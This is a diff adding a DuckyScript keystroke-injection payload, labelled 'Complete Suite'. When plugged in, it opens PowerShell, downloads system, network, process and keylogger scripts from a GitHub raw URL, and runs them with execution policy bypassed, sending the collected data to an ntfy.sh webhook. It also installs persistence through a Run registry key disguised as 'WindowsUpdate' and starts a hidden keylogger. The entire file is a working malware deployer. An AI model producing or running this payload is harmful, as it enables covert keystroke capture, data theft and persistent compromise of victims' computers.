@@ -1,0 +1,73 @@
+REM Complete Suite - Runs all collectors + keylogger + persistence
+
+DELAY 3000
+GUI r
+DELAY 1000
+STRING powershell
+DELAY 1000
+ENTER
+DELAY 1000
+
+REM Create directory
+STRING mkdir $env:TEMP\logger -Force
+DELAY 1000
+ENTER
+DELAY 500
+
+REM Download all scripts
+STRING curl -o "$env:TEMP\logger\sysinfo.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/sysinfo.ps1"
+DELAY 1000
+ENTER
+DELAY 500
+
+STRING curl -o "$env:TEMP\logger\network.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/network.ps1"
+DELAY 1000
+ENTER
+DELAY 500
+
+STRING curl -o "$env:TEMP\logger\process.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/process.ps1"
+DELAY 1000
+ENTER
+DELAY 500
+
+STRING curl -o "$env:TEMP\logger\keylogger.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/keylogger.ps1"
+DELAY 1000
+ENTER
+DELAY 500
+
+REM Run collectors
+STRING powershell -ExecutionPolicy Bypass -File "$env:TEMP\logger\sysinfo.ps1" -webhookUrl "https://ntfy.sh/gamkers"
+DELAY 1000
+ENTER
+DELAY 2000
+
+STRING powershell -ExecutionPolicy Bypass -File "$env:TEMP\logger\network.ps1" -webhookUrl "https://ntfy.sh/gamkers"
+DELAY 1000
+ENTER
+DELAY 2000
+
+STRING powershell -ExecutionPolicy Bypass -File "$env:TEMP\logger\process.ps1" -webhookUrl "https://ntfy.sh/gamkers"
+DELAY 1000
+ENTER
+DELAY 2000
+
+REM Add persistence
+STRING reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdate /t REG_SZ /d "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\logger\keylogger.ps1`" -webhookUrl https://ntfy.sh/gamkers" /f
+DELAY 1000
+ENTER
+DELAY 2000
+
+REM Start keylogger
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "$env:TEMP\logger\keylogger.ps1" -webhookUrl "https://ntfy.sh/gamkers"
+DELAY 1000
+ENTER
+DELAY 2000
+
+STRING Write-Host "Complete Suite Deployed!" -ForegroundColor Green
+DELAY 1000
+ENTER
+DELAY 1000
+
+STRING exit
+DELAY 1000
+ENTER
